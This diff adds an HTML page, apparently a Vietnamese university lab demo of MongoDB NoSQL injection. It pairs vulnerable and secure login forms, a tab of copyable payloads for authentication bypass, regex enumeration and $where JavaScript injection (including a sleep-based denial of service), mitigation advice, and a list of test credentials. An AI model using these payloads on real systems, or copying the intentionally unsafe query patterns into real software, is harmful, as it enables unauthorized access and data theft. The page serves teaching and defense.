@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MongoDB NoSQL Injection Demo - An toàn Web và CSDL</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .header {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        .header h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 2.5em;
+        }
+
+        .header .subtitle {
+            color: #666;
+            font-size: 1.1em;
+        }
+
+        .warning {
+            background: #fff3cd;
+            border-left: 5px solid #ffc107;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+        }
+
+        .warning strong {
+            color: #856404;
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+            margin-bottom: 30px;
+        }
+
+        .card {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+
+        .card.vulnerable {
+            border-top: 5px solid #dc3545;
+        }
+
+        .card.secure {
+            border-top: 5px solid #28a745;
+        }
+
+        .card h2 {
+            margin-bottom: 20px;
+            color: #333;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .badge {
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.75em;
+            font-weight: bold;
+        }
+
+        .badge-danger {
+            background: #dc3545;
+            color: white;
+        }
+
+        .badge-success {
+            background: #28a745;
+            color: white;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555;
+            font-weight: 600;
+        }
+
+        input[type="text"],
+        input[type="password"],
+        textarea {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 1em;
+            transition: border-color 0.3s;
+        }
+
+        input:focus,
+        textarea:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        textarea {
+            font-family: 'Courier New', monospace;
+            min-height: 100px;
+            resize: vertical;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px 25px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 1em;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+        }
+
+        button:active {
+            transform: translateY(0);
+        }
+
+        .result {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 8px;
+            display: none;
+        }
+
+        .result.success {
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            color: #155724;
+        }
+
+        .result.error {
+            background: #f8d7da;
+            border: 1px solid #f5c6cb;
+            color: #721c24;
+        }
+
+        .result.show {
+            display: block;
+        }
+
+        .user-info {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 10px;
+        }
+
+        .user-info h4 {
+            margin-bottom: 10px;
+            color: #333;
+        }
+
+        .user-info p {
+            margin: 5px 0;
+            color: #666;
+        }
+
+        .exploit-guide {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            margin-bottom: 30px;
+        }
+
+        .exploit-guide h2 {
+            color: #dc3545;
+            margin-bottom: 20px;
+        }
+
+        .exploit-item {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            border-left: 4px solid #dc3545;
+        }
+
+        .exploit-item h3 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .code {
+            background: #272822;
+            color: #f8f8f2;
+            padding: 15px;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            overflow-x: auto;
+            margin: 10px 0;
+        }
+
+        .copy-btn {
+            background: #6c757d;
+            padding: 5px 15px;
+            font-size: 0.85em;
+            width: auto;
+            margin-top: 10px;
+        }
+
+        .tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .tab {
+            padding: 10px 20px;
+            background: #e9ecef;
+            border: none;
+            border-radius: 8px 8px 0 0;
+            cursor: pointer;
+            font-weight: 600;
+            color: #666;
+        }
+
+        .tab.active {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        @media (max-width: 968px) {
+            .grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔓 MongoDB NoSQL Injection Demo</h1>
+            <p class="subtitle">Đề tài: Tìm hiểu hệ CSDL MongoDB - Môn An toàn Web và CSDL</p>
+            <div class="warning">
+                <strong>⚠️ CẢNH BÁO:</strong> Đây là demo cho mục đích học tập. KHÔNG sử dụng các kỹ thuật này trên hệ thống thực tế!
+            </div>
+        </div>
+
+        <div class="exploit-guide">
+            <h2>📚 Hướng dẫn Khai thác (Exploit Guide)</h2>
+            
+            <div class="tabs">
+                <button class="tab active" onclick="switchTab('attack1')">Attack 1: Bypass Login</button>
+                <button class="tab" onclick="switchTab('attack2')">Attack 2: Data Extraction</button>
+                <button class="tab" onclick="switchTab('attack3')">Attack 3: JS Injection</button>
+                <button class="tab" onclick="switchTab('protection')">🛡️ Phòng chống</button>
+            </div>
+
+            <div id="attack1" class="tab-content active">
+                <div class="exploit-item">
+                    <h3>🎯 Attack 1: Authentication Bypass</h3>
+                    <p><strong>Mô tả:</strong> Sử dụng MongoDB operators để bypass xác thực mà không cần biết password.</p>
+                    <p><strong>Cách thực hiện:</strong></p>
+                    <ol>
+                        <li>Ở form "Vulnerable Login", nhập payload sau vào Username và Password</li>
+                        <li>Payload sẽ khiến query luôn trả về true</li>
+                    </ol>
+                    
+                    <p><strong>Payload 1 - Not Equal:</strong></p>
+                    <div class="code">{"$ne": null}</div>
+                    <button class="copy-btn" onclick='copyToClipboard("{\"$ne\": null}")'>📋 Copy</button>
+                    <p style="margin-top: 15px;"><strong>Payload 2 - Greater Than:</strong></p>
+                    <div class="code">{"$gt": ""}</div>
+                    <button class="copy-btn" onclick='copyToClipboard("{\"$gt\": \"\"}")'>📋 Copy</button>
+
+                    <p style="margin-top: 15px;"><strong>Giải thích:</strong> Khi gửi <code>{"$ne": null}</code>, MongoDB query trở thành:</p>
+                    <div class="code">db.users.findOne({ username: {$ne: null}, password: {$ne: null} })</div>
+                    <p>Điều này luôn đúng với user đầu tiên trong database (thường là admin)!</p>
+                </div>
+            </div>
+
+            <div id="attack2" class="tab-content">
+                <div class="exploit-item">
+                    <h3>🎯 Attack 2: Regex Injection - Data Extraction</h3>
+                    <p><strong>Mô tả:</strong> Sử dụng regex để trích xuất dữ liệu từng ký tự.</p>
+                    <p><strong>Cách thực hiện:</strong></p>
+                    
+                    <p><strong>Payload 1 - Tìm users bắt đầu bằng 'a':</strong></p>
+                    <div class="code">^a</div>
+                    <button class="copy-btn" onclick="copyToClipboard('^a')">📋 Copy</button>
+                    
+                    <p style="margin-top: 15px;"><strong>Payload 2 - Tìm users bắt đầu bằng 'admin':</strong></p>
+                    <div class="code">^admin</div>
+                    <button class="copy-btn" onclick="copyToClipboard('^admin')">📋 Copy</button>
+                    
+                    <p style="margin-top: 15px;"><strong>Payload 3 - Tìm tất cả (wildcard):</strong></p>
+                    <div class="code">.*</div>
+                    <button class="copy-btn" onclick="copyToClipboard('.*')">📋 Copy</button>
+                    
+                    <p style="margin-top: 15px;"><strong>Advanced - Blind Enumeration:</strong></p>
+                    <div class="code">^admin.*</div>
+                    <button class="copy-btn" onclick="copyToClipboard('^admin.*')">📋 Copy</button>
+                    
+                    <p style="margin-top: 15px;"><strong>Giải thích:</strong> Attacker có thể dùng regex để enumerate từng ký tự của username/password một cách mù quáng (blind).</p>
+                </div>
+            </div>
+
+            <div id="attack3" class="tab-content">
+                <div class="exploit-item">
+                    <h3>🎯 Attack 3: JavaScript Injection với $where</h3>
+                    <p><strong>Mô tả:</strong> Lỗ hổng CỰC KỲ NGUY HIỂM - cho phép thực thi JavaScript code trên server.</p>
+                    <p><strong>⚠️ CẢNH BÁO:</strong> Đây là lỗ hổng nghiêm trọng nhất!</p>
+                    
+                    <p><strong>Payload 1 - Luôn trả về true:</strong></p>
+                    <div class="code">' || '1'=='1</div>
+                    <button class="copy-btn" onclick="copyToClipboard('\' || \'1\'==\'1')">📋 Copy</button>
+                    
+                    <p style="margin-top: 15px;"><strong>Payload 2 - Comment out phần còn lại:</strong></p>
+                    <div class="code">'; return true; //</div>
+                    <button class="copy-btn" onclick="copyToClipboard('\'; return true; //')">📋 Copy</button>
+                    
+                    <p style="margin-top: 15px;"><strong>Payload 3 - Sleep attack (DoS):</strong></p>
+                    <div class="code">'; sleep(5000); return true; //</div>
+                    <button class="copy-btn" onclick="copyToClipboard('\'; sleep(5000); return true; //')">📋 Copy</button>
+                    
+                    <p style="margin-top: 15px;"><strong>Giải thích:</strong> Query ban đầu:</p>
+                    <div class="code">$where: "this.username == 'USER_INPUT'"</div>
+                    <p>Sau khi inject <code>' || '1'=='1</code>, query trở thành:</p>
+                    <div class="code">$where: "this.username == '' || '1'=='1'"</div>
+                    <p>Kết quả: Luôn trả về true cho tất cả documents!</p>
+                </div>
+            </div>
+
+            <div id="protection" class="tab-content">
+                <div class="exploit-item">
+                    <h3>🛡️ Các biện pháp phòng chống NoSQL Injection</h3>
+                    
+                    <h4 style="margin-top: 20px;">1. Input Validation & Sanitization</h4>
+                    <div class="code">// Kiểm tra kiểu dữ liệu
+if (typeof username !== 'string' || typeof password !== 'string') {
+    return error('Invalid input type');
+}
+
+// Loại bỏ các ký tự nguy hiểm
+const dangerous = /[\$\{\}]/;
+if (dangerous.test(input)) {
+    return error('Invalid characters');
+}</div>
+                    
+                    <h4 style="margin-top: 20px;">2. Sử dụng $eq Operator</h4>
+                    <div class="code">// KHÔNG AN TOÀN
+db.users.findOne({ username: req.body.username })
+
+// AN TOÀN
+db.users.findOne({ username: { $eq: req.body.username } })</div>
+                    
+                    <h4 style="margin-top: 20px;">3. Tránh $where Operator</h4>
+                    <div class="code">// TUYỆT ĐỐI TRÁNH
+db.users.findOne({ $where: `this.username == '${input}'` })
+
+// SỬ DỤNG
+db.users.findOne({ username: { $eq: input } })</div>
+                    
+                    <h4 style="margin-top: 20px;">4. Implement Authentication & Authorization</h4>
+                    <ul style="margin-top: 10px;">
+                        <li>Bật authentication trên MongoDB</li>
+                        <li>Sử dụng role-based access control (RBAC)</li>
+                        <li>Principle of least privilege</li>
+                    </ul>
+                    
+                    <h4 style="margin-top: 20px;">5. Use ORM/ODM Libraries</h4>
+                    <div class="code">// Mongoose tự động escape
+const User = mongoose.model('User', userSchema);
+User.findOne({ username: username }); // Safe</div>
+                    
+                    <h4 style="margin-top: 20px;">6. Rate Limiting & Monitoring</h4>
+                    <ul style="margin-top: 10px;">
+                        <li>Giới hạn số lần đăng nhập sai</li>
+                        <li>Monitor suspicious queries</li>
+                        <li>Log tất cả failed attempts</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="grid">
+            <!-- VULNERABLE LOGIN -->
+            <div class="card vulnerable">
+                <h2>
+                    <span>🔓 Vulnerable Login</span>
+                    <span class="badge badge-danger">CÓ LỖ HỔNG</span>
+                </h2>
+                <form id="vulnerableLoginForm">
+                    <div class="form-group">
+                        <label>Username:</label>
+                        <input type="text" id="vulnUsername" placeholder='Thử: {"$ne": null}'>
+                    </div>
+                    <div class="form-group">
+                        <label>Password:</label>
+                        <input type="password" id="vulnPassword" placeholder='Thử: {"$ne": null}'>
+                    </div>
+                    <button type="submit">🚀 Login (Vulnerable)</button>
+                </form>
+                <div id="vulnerableResult" class="result"></div>
+            </div>
+
+            <!-- SECURE LOGIN -->
+            <div class="card secure">
+                <h2>
+                    <span>🔒 Secure Login</span>
+                    <span class="badge badge-success">BẢO MẬT</span>
+                </h2>
+                <form id="secureLoginForm">
+                    <div class="form-group">
+                        <label>Username:</label>
+                        <input type="text" id="secureUsername" placeholder="admin">
+                    </div>
+                    <div class="form-group">
+                        <label>Password:</label>
+                        <input type="password" id="securePassword" placeholder="Admin@123">
+                    </div>
+                    <button type="submit">✅ Login (Secure)</button>
+                </form>
+                <div id="secureResult" class="result"></div>
+            </div>
+
+            <!-- VULNERABLE SEARCH -->
+            <div class="card vulnerable">
+                <h2>
+                    <span>🔍 Vulnerable Search</span>
+                    <span class="badge badge-danger">REGEX INJECTION</span>
+                </h2>
+                <form id="searchForm">
+                    <div class="form-group">
+                        <label>Search Username:</label>
+                        <input type="text" id="searchTerm" placeholder='Thử: ^admin hoặc .*'>
+                    </div>
+                    <button type="submit">🔎 Search</button>
+                </form>
+                <div id="searchResult" class="result"></div>
+            </div>
+
+            <!-- VULNERABLE WHERE -->
+            <div class="card vulnerable">
+                <h2>
+                    <span>⚠️ Check Username ($where)</span>
+                    <span class="badge badge-danger">JS INJECTION</span>
+                </h2>
+                <form id="checkUsernameForm">
+                    <div class="form-group">
+                        <label>Username to check:</label>
+                        <input type="text" id="checkUsername" placeholder="Thử: '; return true; //">
+                    </div>
+                    <button type="submit">✔️ Check Availability</button>
+                </form>
+                <div id="checkResult" class="result"></div>
+            </div>
+        </div>
+
+        <!-- VALID CREDENTIALS -->
+        <div class="card">
+            <h2>📋 Valid Credentials (For Testing)</h2>
+            <div class="user-info">
+                <p><strong>Username:</strong> admin | <strong>Password:</strong> Admin@123 | <strong>Role:</strong> Admin</p>
+                <p><strong>Username:</strong> john_doe | <strong>Password:</strong> John123! | <strong>Role:</strong> User</p>
+                <p><strong>Username:</strong> jane_smith | <strong>Password:</strong> Jane@456 | <strong>Role:</strong> User</p>
+                <p><strong>Username:</strong> bob_wilson | <strong>Password:</strong> Bob#789 | <strong>Role:</strong> Manager</p>
+                <p><strong>Username:</strong> alice_brown | <strong>Password:</strong> Alice$321 | <strong>Role:</strong> User</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Switch tabs
+        function switchTab(tabId) {
+            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
+            
+            event.target.classList.add('active');
+            document.getElementById(tabId).classList.add('active');
+        }
+
+        // Copy to clipboard
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                alert('✅ Đã copy payload: ' + text);
+            });
+        }
+
+        // Show result
+        function showResult(elementId, success, message, data = null) {
+            const resultDiv = document.getElementById(elementId);
+            resultDiv.className = `result ${success ? 'success' : 'error'} show`;
+            
+            let html = `<strong>${success ? '✅ Thành công!' : '❌ Thất bại!'}</strong><p>${message}</p>`;
+            
+            if (data && data.user) {
+                html += `
+                    <div class="user-info">
+                        <h4>📊 Thông tin User (Data Leaked!):</h4>
+                        <p><strong>Username:</strong> ${data.user.username}</p>
+                        <p><strong>Email:</strong> ${data.user.email}</p>
+                        <p><strong>Role:</strong> ${data.user.role}</p>
+                        <p><strong>Department:</strong> ${data.user.department}</p>
+                        <p><strong>💰 Salary:</strong> ${data.user.salary}</p>
+                        <p><strong>🔐 SSN:</strong> ${data.user.ssn}</p>
+                    </div>
+                `;
+            }
+            
+            if (data && data.results) {
+                html += `<div class="user-info"><h4>🔍 Kết quả tìm kiếm (${data.results.length} users):</h4>`;
+                data.results.forEach(user => {
+                    html += `<p>• ${user.username} (${user.email}) - ${user.role}</p>`;
+                });
+                html += `</div>`;
+            }
+            
+            resultDiv.innerHTML = html;
+        }
+
+        // Vulnerable Login
+        document.getElementById('vulnerableLoginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            let username = document.getElementById('vulnUsername').value;
+            let password = document.getElementById('vulnPassword').value;
+            
+            // Try to parse as JSON (for payload injection)
+            try {
+                username = JSON.parse(username);
+            } catch (e) {
+                // If not JSON, keep as string
+            }
+            
+            try {
+                password = JSON.parse(password);
+            } catch (e) {
+                // If not JSON, keep as string
+            }
+            
+            try {
+                const response = await fetch('/api/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, password })
+                });
+                
+                const data = await response.json();
+                showResult('vulnerableResult', data.success, data.message, data);
+            } catch (error) {
+                showResult('vulnerableResult', false, 'Lỗi: ' + error.message);
+            }
+        });
+
+        // Secure Login
+        document.getElementById('secureLoginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const username = document.getElementById('secureUsername').value;
+            const password = document.getElementById('securePassword').value;
+            
+            try {
+                const response = await fetch('/api/secure-login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, password })
+                });
+                
+                const data = await response.json();
+                showResult('secureResult', data.success, data.message, data);
+            } catch (error) {
+                showResult('secureResult', false, 'Lỗi: ' + error.message);
+            }
+        });
+
+        // Vulnerable Search
+        document.getElementById('searchForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const searchTerm = document.getElementById('searchTerm').value;
+            
+            try {
+                const response = await fetch('/api/search', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ searchTerm })
+                });
+                
+                const data = await response.json();
+                showResult('searchResult', data.success, `Tìm thấy ${data.results?.length || 0} kết quả`, data);
+            } catch (error) {
+                showResult('searchResult', false, 'Lỗi: ' + error.message);
+            }
+        });
+
+        // Check Username (Vulnerable $where)
+        document.getElementById('checkUsernameForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const username = document.getElementById('checkUsername').value;
+            
+            try {
+                const response = await fetch('/api/check-username', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username })
+                });
+                
+                const data = await response.json();
+                showResult('checkResult', true, data.message);
+            } catch (error) {
+                showResult('checkResult', false, 'Lỗi: ' + error.message);
+            }
+        });
+    </script>
+</body>
+</html>
